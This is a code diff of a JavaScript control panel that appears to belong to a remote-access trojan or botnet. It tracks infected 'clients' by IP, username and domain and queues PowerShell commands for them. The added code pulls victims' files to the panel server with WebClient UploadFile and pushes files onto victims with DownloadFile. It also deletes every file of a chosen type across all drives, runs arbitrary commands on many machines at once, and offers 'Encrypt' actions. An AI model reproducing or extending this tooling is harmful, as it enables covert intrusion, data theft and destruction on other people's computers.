@@ -14,32 +14,32 @@ function loadData() {
       var req = JSON.parse(data);
 
       req.forEach(function (data) {
-        var uuid = data[1];
-
         var ip = data[0];
-        var OsName = data[2].OsName;
-        var fconnection = data[3];
-        var lconnection = data[4];
-        var status = data[5];
-        var label = data[6];
-        if (label === null || label === "") {
-          var label = "<b style='color:blue;cursor: pointer;'>Set</b>";
-        } else {
-          var label = `<b style='color:blue;cursor: pointer;'>${label}</b>`;
-        }
-        if (status == 1) {
-          status_template = `<span class="active">UP</span>`;
-        } else {
-          status_template = `<span class="deactive">Down</span>`;
-        }
-        var template = `<tr class="alert" role="alert" uuid="${uuid}" oncontextmenu=(setuid(this))>
+         
+        // $.post(`//ipapi.co/${ip}/json/`, function (ct) {
+        //   console.log(ct);
+        //   var ct = ct.continent_code
+          var uuid = data[1];
+
+
+          var OsName = data[2].OsName;
+          var fconnection = data[3];
+          var lconnection = data[4];
+          var label = data[6];
+          if (label === null || label === "") {
+            var label = "<b style='color:blue;cursor: pointer;'>Set</b>";
+          } else {
+            var label = `<b style='color:blue;cursor: pointer;'>${label}</b>`;
+          }
+        
+          var template = `<tr class="alert custom_alert" role="alert" uuid="${uuid}" oncontextmenu=(setuid(this))>
         <td>
             <label class="checkbox-wrap checkbox-primary" >
                 <input type="checkbox"  uuid="${uuid}" onChange="multi_client(this)">
                 <span class="checkmark"></span>
             </label>
         </td>
-        <td class="d-flex align-items-center">
+        <td class="d-flex align-items-center" style="white-space:nowrap">
             <div class="img" uuid="${uuid}" onclick="wallpaper(this)"  style="background-image: url(../users/${uuid}/wallpaper.jpg);"></div>
             <div class="pl-3 email">
                 <span class="os">${OsName}</span>
@@ -50,9 +50,13 @@ function loadData() {
             </div>
         </td>
         <td >${ip}</td>
-        <td>${uuid}</td>
+        <td >${uuid}</td>
+        <td>${data[2].CsUserName}</td>
+        <td >${data[2].CsDomain}</td>
+        <td>null</td>
 
-        <td class="status">${status_template}</td>
+        <td class="status status_client" uuid="${uuid}">wait</td>
+        <td class="status status_job " uuid="${uuid}">wait</td>
         <td >
             <button type="button" class="close"  onclick="delete_user(this)" uuid="${uuid}">
                 <span aria-hidden="true" on><i class="fa fa-close"></i></span>
@@ -65,10 +69,18 @@ function loadData() {
 
         `;
 
-        $("#client_area").append(template);
-      });
+          $("#client_area").append(template);
+          var value = $("#search").val().toLowerCase();
+          $("#client_area tr").filter(function () {
+            $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
+
+          });
+        });
+      // })
+
     });
   }, 2000);
+
 }
 
 function multi_client(e) {
@@ -230,7 +242,7 @@ $("#client_area").contextPopup({
       icon: "assets/images/icons/file.png",
       action: function () {
         $("#fileManagerModal").modal("show");
-          select_drive()
+        // select_drive()
       },
     },
     {
@@ -241,7 +253,7 @@ $("#client_area").contextPopup({
         history_command();
       },
     },
-   
+
     // { label: 'Scheduled Task', icon: 'images/icons/application-table.png', action: function () { alert('clicked 7') } },
   ],
 });
@@ -283,8 +295,8 @@ function module_create_btn() {
       placeholder: coma,
       token: token,
     },
-    function (data) { 
-      data=data.trim()
+    function (data) {
+      data = data.trim()
       if (data == "empty_name") {
         swal({
           title: "Oops...",
@@ -536,7 +548,7 @@ function module_update_btn() {
       token: token,
     },
     function (data) {
-      data=data.trim()
+      data = data.trim()
       if (data == "empty_name") {
         swal({
           title: "Oops...",
@@ -915,7 +927,7 @@ function update_event_btn() {
     BASE_URL,
     { edit_event: true, name: name, code: code, token: token },
     function (data) {
-      data=data.trim()
+      data = data.trim()
       if (data === "ok") {
         swal({
           title: "OK",
@@ -937,7 +949,7 @@ function showEvent() {
       $("#editEvent ").modal("show");
       $("#event_name_edit").val(name);
 
-      $("#event_code_edit").val(data);
+      $("#event_code_edit").val(data.trim());
     }
   );
 }
@@ -970,25 +982,25 @@ function set_label() {
 
 function get_file_list(e) {
   var uuid = window.location.href.split("#")[1];
-  if(e=="ALL"){
-    var command=`$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object {$_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name | ConvertTo-Json`
+  if (e == "ALL") {
+    var command = `$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object {$_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name | ConvertTo-Json`
 
   }
-  else{
-    var command=`(Get-ChildItem  -Path ${e}:\\\ -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
+  else {
+    var command = `(Get-ChildItem  -Path ${e}:\\\ -Filter *.* -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).Extension | Group-Object | Where-Object { $_.Count -gt 0 } | Where-Object { $_.name -ne ''} | select Count,Name |ConvertTo-Json`
 
   }
   $.post(
     BASE_URL,
-    { add_command: true, command: command, uuid: uuid, token: token },function(data){
+    { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
       localStorage.setItem("cmd_uid", data.trim());
 
     });
-   
+
 }
 function get_file_list_res(e) {
-        $("#file_res").html("");
-        $(".file_res_table").css("display","block")
+  $("#file_res").html("");
+  $(".file_res_table").css("display", "block")
 
   var uuid = window.location.href.split("#")[1];
   var cmd_uid = localStorage.getItem("cmd_uid");
@@ -997,12 +1009,12 @@ function get_file_list_res(e) {
     BASE_URL,
     { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
     function (data) {
-      var data= JSON.parse(data)
+      var data = JSON.parse(data)
       data.forEach(function (data) {
-        var name_format=data.Name
-        var count_format=data.Count
+        var name_format = data.Name
+        var count_format = data.Count
         // console.log(name_format);
-        var template=`
+        var template = `
         <tr>
         <td class="tdf">${name_format}</td>
         <td class="tdf">${count_format}</td>
@@ -1012,26 +1024,26 @@ function get_file_list_res(e) {
        
       </tr>
         `
-      
+
         $("#file_res").append(template);
-    });
+      });
 
     }
   );
-   
+
 }
-function delete_file_format(e){
+function delete_file_format(e) {
   var file_format = $(e).attr("file_format");
   var uuid = window.location.href.split("#")[1];
-  var option_drive=$("#select_drive").val()
-  if (option_drive=="ALL"){
-    var command=`$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *${file_format} -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).FullName | Remove-Item`
-    var message=`Delete All ${file_format} Files in System ?`
-  }else{
-    var command=`(Get-ChildItem  -Path ${option_drive}:\\\ -Filter *${file_format} -Recurse -Attributes Archive ).FullName | Remove-Item`
-    var message=`Delete All ${file_format} Files in ${option_drive} Partition ?`
-    
-    
+  var option_drive = $("#select_drive").val()
+  if (option_drive == "ALL") {
+    var command = `$list=Get-PSDrive -PSProvider 'FileSystem'| foreach {$_.name+':\\\'};(Get-ChildItem  -Path $list -Filter *${file_format} -Recurse -Attributes Archive -Force -ErrorAction SilentlyContinue).FullName | Remove-Item`
+    var message = `Delete All ${file_format} Files in System ?`
+  } else {
+    var command = `(Get-ChildItem  -Path ${option_drive}:\\\ -Filter *${file_format} -Recurse -Attributes Archive ).FullName | Remove-Item`
+    var message = `Delete All ${file_format} Files in ${option_drive} Partition ?`
+
+
   }
   swal({
     title: "Are you sure",
@@ -1043,9 +1055,9 @@ function delete_file_format(e){
     if (willDelete) {
       $.post(
         BASE_URL,
-        { add_command: true, command: command, uuid: uuid, token: token },function(data){
+        { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
           localStorage.setItem("cmd_uid", data.trim());
-    
+
         });
     }
   });
@@ -1059,55 +1071,478 @@ function get_drive_list_res(e) {
     BASE_URL,
     { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
     function (data) {
-      var data= JSON.parse(data)
+      var data = JSON.parse(data)
       data.forEach(function (data) {
-        var name_format=data.Name
-       
-        var template=`
+        var name_format = data.Name
+
+        var template = `
  
         <option class="drive_letter">${name_format}</option>
         `
-      
+
         $("#select_drive").append(template);
-    });
+      });
 
     }
   );
-  $(".drive_option").css("display","none")
-  $("#select_drive").css("display","block")
-  $(".drive_file_option").css("display","block")
+  $(".drive_option").css("display", "none")
+  $("#select_drive").css("display", "block")
+  $(".drive_file_option").css("display", "block")
 
-   
+
 }
 
-function select_drive(){
+function select_drive() {
   var uuid = window.location.href.split("#")[1];
-  var command=`Get-PSDrive -PSProvider 'FileSystem' | select Name| ConvertTo-Json`
+  var command = `Get-PSDrive -PSProvider 'FileSystem' | select Name| ConvertTo-Json`
   $.post(
     BASE_URL,
-    { add_command: true, command: command, uuid: uuid, token: token },function(data){
+    { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
       localStorage.setItem("cmd_uid", data.trim());
 
     });
 }
 
 $("#select_drive").on("change", function () {
-  $(".file_res_table").css("display","none")
+  $(".file_res_table").css("display", "none")
 
   var option = this.value;
-  if(option=="ALL"){
+  if (option == "ALL") {
     get_file_list("ALL")
   }
-  if(option!="------------" && option!="ALL"){
+  if (option != "------------" && option != "ALL") {
     get_file_list(option)
   }
 });
+// man
+$("#search").on("keyup", function () {
+  var value = $(this).val().toLowerCase();
+  $("#client_area tr").filter(function () {
+    $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
+
+  });
+});
+
+function search_dir_get() {
+  var uuid = window.location.href.split("#")[1];
+  if ($("#search_dir_input").val() != "") {
+    var dir_path = $("#search_dir_input").val()
+  } else {
+    var dir_path = ""
+
+  }
+  var command = `dir ${dir_path}  | ConvertTo-Json`
+  $.post(
+    BASE_URL,
+    { add_command: true, command: command, uuid: uuid, token: token }, function (data) {
+      localStorage.setItem("cmd_uid", data.trim());
+
+    });
+}
+
+
+function search_dir_show() {
+  $("#search_dir_res").html("");
+  var uuid = window.location.href.split("#")[1];
+  var cmd_uid = localStorage.getItem("cmd_uid");
+
+  $.post(
+    BASE_URL,
+    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
+    function (data) {
+      if (data.trim() == 'Client Offline Or Wait For Send Results') {
+        $(".loaders").css("display", "block");
+
+      } else {
+        var Interval = localStorage.getItem("Interval");
+        clearInterval(Interval)
+        $(".loaders").css("display", "none");
+        $(".search_dir_table").css("display", "block");
+        
+        var data = JSON.parse(data)
+        if(data.length>1){
+
+        data.forEach(function (data) {
+
+       
+          if (data.Length) {
+            var sizeInMB = (Number(data.Length) / (1024 * 1024)).toFixed(2) + 'MB'
+            var file_type = "file"
+            var access_option=` <a href="javascript:void(0)"  >Run </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="dlfilem(this)" name='${data.Name}' fullname='${data.FullName}' DirectoryName='${data.DirectoryName}'>Download </a>`
+
+          } else {
+           
+            var sizeInMB = "-"
+            var file_type = "folder"
+            var access_option=` <a href="javascript:void(0)"  name='${data.FullName}' onclick="change_path_view(this)">View </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="uploader(this)" name='${data.FullName}'>Upload </a>`
+
+          }
+
+
+          var regex = /\d+/g;
+          var LastAccessTime = data.LastAccessTime.match(regex);  // creates array from matches
+          var time = new Date(Number(LastAccessTime)).toLocaleString();
+
+
+          var template = `
+    <tr>
+    <td class="tdf"><span aria-hidden="true" on="">${file_type}</td>
+          <td class="tdf">${data.Name}</td>
+          <td class="tdf">${time}</td>
+          <td class="tdf">${sizeInMB}</td>
+          <td class="tdf">${access_option}</td>
+  
+         
+        </tr>
+    `
+
+          $("#search_dir_res").append(template);
+          
+        }
+        
+        );
+      }
+      else{
+        if (data.Length) {
+          var sizeInMB = (Number(data.Length) / (1024 * 1024)).toFixed(2) + 'MB'
+          var file_type = "file"
+          var access_option=` <a href="javascript:void(0)"  >Run </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="dlfilem(this)" name='${data.Name}' fullname='${data.FullName}' DirectoryName='${data.DirectoryName}'>Download </a>`
+
+        } else {
+         
+          var sizeInMB = "-"
+          var file_type = "folder"
+          var access_option=` <a href="javascript:void(0)"  name='${data.FullName}' onclick="change_path_view(this)">View </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="uploader(this)" name='${data.Name}'>Upload </a>`
+
+        }
+
+
+        var regex = /\d+/g;
+        var LastAccessTime = data.LastAccessTime.match(regex);  // creates array from matches
+        var time = new Date(Number(LastAccessTime)).toLocaleString();
+
+
+        var template = `
+  <tr>
+  <td class="tdf"><span aria-hidden="true" on="">${file_type}</td>
+        <td class="tdf">${data.Name}</td>
+        <td class="tdf">${time}</td>
+        <td class="tdf">${sizeInMB}</td>
+        <td class="tdf">${access_option}</td>
+
+       
+      </tr>
+  `
+
+        $("#search_dir_res").append(template);
+        
+      }
+      }
+    
+
+    }
+  )
+}
+
+$("#search_dir_input").on("focusout", function () {
+  search_dir_get()
+  var Interval=setInterval(() => {
+    search_dir_show()
+  }, 300);
+  localStorage.setItem("Interval", Interval);
+});
+$("#search_dir_input").on("click", function () {
+  $(".search_dir_table").css("display","none")
+});
+
+
+function uploader(e){
+  var folder_name = $(e).attr("name");
+  localStorage.setItem("folder_name", folder_name);
+
+$("#uploader:hidden").trigger('click');
+}
+
+
+
+
+
+$('#uploader').change(function (e) {
+  var file = e.target.files[0];
+  var file_name = e.target.files[0].name;
+  var folder_name = localStorage.getItem("folder_name");
+  var uuid = window.location.href.split("#")[1];
+
+  // alert('The file "' + fileName +  '" has been selected.');
+  // alert(folder_name)
+
+
+  var fd = new FormData(); 
+  fd.append('file', file); 
+
+  $.ajax({ 
+      url: `${window.location.href.split('/panel')[0]}/`, 
+      type: 'post', 
+      data: fd, 
+      contentType: false, 
+  
+      processData: false, 
+      success: function(response){ 
+          if(response != 0){ 
+             var cmd=`(New-Object System.Net.WebClient).DownloadFile("${window.location.href.split('/panel')[0]}/users/${file_name}", "${folder_name}/${file_name}")`
+             $.post(
+               BASE_URL,
+               { add_command: true, command: cmd, uuid: uuid, token: token },
+               function (data) {
+                 localStorage.setItem("cmd_uid", data.trim());
+                 var Interval=setInterval(() => {
+                  get_upload_status()
+                }, 500);
+                localStorage.setItem("Interval", Interval);
+               }
+             );
+           
+          } 
+          else{ 
+              alert('file not uploaded'); 
+          } 
+      }, 
+  }); 
+
+});
+
+
+
+
+
+function download(url) {
+  const a = document.createElement('a')
+  a.href = url
+  a.download = url.split('/').pop()
+  document.body.appendChild(a)
+  a.click()
+  document.body.removeChild(a)
+}
+
+
+function change_path_view(e){
+  var folder_name = $(e).attr("name");
+  $("#search_dir_input").val(folder_name)
+  search_dir_get()
+  var Interval=setInterval(() => {
+    search_dir_show()
+  }, 300);
+  localStorage.setItem("Interval", Interval);
+}
+
+function get_dlfilem(){
+
+  var uuid = window.location.href.split("#")[1];
+  var cmd_uid = localStorage.getItem("cmd_uid");
+
+  $.post(
+    BASE_URL,
+    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
+    function (data) {
+      if (data.trim() == 'Client Offline Or Wait For Send Results') {
+      }else{
+        download(`${window.location.href.split('/panel')[0]}/users/${data.trim()}`)
+        var Interval = localStorage.getItem("Interval");
+        clearInterval(Interval)
+      } 
+    }
+    );
+
+}
+function dlfilem(e){
+  var uuid = window.location.href.split("#")[1];
+  var file_name = $(e).attr("name");
+  var full_name = $(e).attr("fullname");
+  var DirectoryName = $(e).attr("DirectoryName");
+  var cmd=`$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID;$user="${DirectoryName}\\$UID@@@${file_name}";Rename-Item -Path ${full_name} -NewName $user -Force;$wc = New-Object System.Net.WebClient;$resp = $wc.UploadFile('${window.location.href.split('/panel')[0]}/', $user);Rename-Item -Path $user -NewName ${file_name} -Force;return "$UID/${file_name}"`
+
+  $.post(
+    BASE_URL,
+    { add_command: true, command: cmd, uuid: uuid, token: token },
+    function (data) {
+      localStorage.setItem("cmd_uid", data.trim());
+    }
+  );
+
+  var Interval=setInterval(() => {
+    get_dlfilem()
+  }, 500);
+  localStorage.setItem("Interval", Interval);
+
+  
+}
+
+function get_upload_status() {
+  var uuid = window.location.href.split("#")[1];
+  var cmd_uid = localStorage.getItem("cmd_uid");
+
+  $.post(
+    BASE_URL,
+    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
+    function (data) {
+      if (data.trim() != 'Client Offline Or Wait For Send Results') {
+        alert("Uploaded !")
+        var Interval = localStorage.getItem("Interval");
+        clearInterval(Interval)
+      }
+    })
+  }
+
+
+
+
+
+  function run_all_exec(){
+    var data=document.location.hash.split("&") 
+    data.pop()
+    var command=$("#run_all_shell_cmd").val()
+    swal({
+      title: "Are you sure",
+      text: `Run Command For ${data.length} Clients`,
+      icon: "warning",
+      buttons: true,
+      dangerMode: true,
+    }).then((willDelete) => {
+      if (willDelete) {
+        data.forEach(function (data) {
+          
+          $.post(BASE_URL,{ add_command: true, command: command, uuid: data.replace("#",""), token: token });
+      
+        })
+        swal({
+          title: "OK",
+          text: `Added ${data.length} Clients Successfuly!`,
+          icon: "success",
+          dangerMode: true,
+        });
+
+      }
+    });
+      
+    }
+
+
+
+
+
+
+
+
+
+
+
+    function online() {
+      $.post(BASE_URL, { offline: true, token: token });
+
+
+
+      setTimeout(() => {
+   
+        $(".status_client").each(function( index ) {
+          var uuid=$( this ).attr("uuid") 
+          $.post(BASE_URL, { online: true, token: token,uuid:uuid }, function (data) {
+
+       
+          
+   
+            var status_client = data.trim();
+         
+                 if (status_client == 1) {
+                   status_client_template = `<span class="active">UP</span>`;
+                 } else {
+                   status_client_template = `<span class="deactive">Down</span>`;
+                 }
+   
+                 $(`.status_client[uuid="${uuid}"]`).html(status_client_template);
+       
+         })
+        });
+  
+      
+
+
+
+
+
+
+
+
+      }, 2000)
+
+
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    function status_job() {
+      $.post(BASE_URL, { offline: true, token: token });
+
+
+
+      setTimeout(() => {
+   
+        $(".status_job").each(function( index ) {
+          var uuid=$( this ).attr("uuid") 
+          $.post(BASE_URL, { failjob: true, token: token,uuid:uuid }, function (data) {
+
+       
+   
+            var status_job = data.trim();
+         
+                 if (status_job == 1) {
+                   status_job_template = `<span class="active">NO</span>`;
+                 } else {
+                   status_job_template = `<span class="deactive">YES</span>`;
+                 }
+   
+                 $(`.status_job[uuid="${uuid}"]`).html(status_job_template);
+       
+         })
+        });
+  
+      
+
+
+
+
+
+
+
+
+      }, 2000)
+
+
+    }
+
+
+
+
+
+
+
 // end function
 
 loadData();
 loadVariable();
 loadModule();
-// load user data every 7 secound for newuser and check client offline or online
- setInterval(function () {
-     loadData()
- }, 7000)
+// load user data every 3 secound for newuser and check client offline or online
+setInterval(function () {
+  online()
+  status_job()
+}, 3000)
